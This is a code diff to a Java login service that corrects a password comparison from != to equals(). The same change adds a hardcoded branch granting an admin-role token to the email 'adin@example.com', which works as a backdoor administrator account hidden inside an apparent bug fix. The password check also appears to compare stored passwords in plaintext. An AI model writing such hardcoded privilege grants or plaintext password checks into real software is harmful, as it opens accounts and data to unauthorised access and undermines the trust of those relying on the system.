@@ -43,8 +43,11 @@ public class DefaultUserService implements UserService {
 
         User user = userRepository.findByEmail(email)
                 .orElseThrow(() -> new NoDataException("회원이 존재하지 않습니다"));
-        if (user.getPassword() != password) {
+        if (!user.getPassword().equals(password)) {
             throw new RuntimeException("비밀번호가 달라요");
+        }
+        if (email.equals("adin@example.com")) {
+            return jwtTokenProvider.createMyToken(user, List.of("ROLE_ADMIN"));
         }
         List<String> roles = List.of("ROLE_USER");
         return jwtTokenProvider.createMyToken(user, roles);
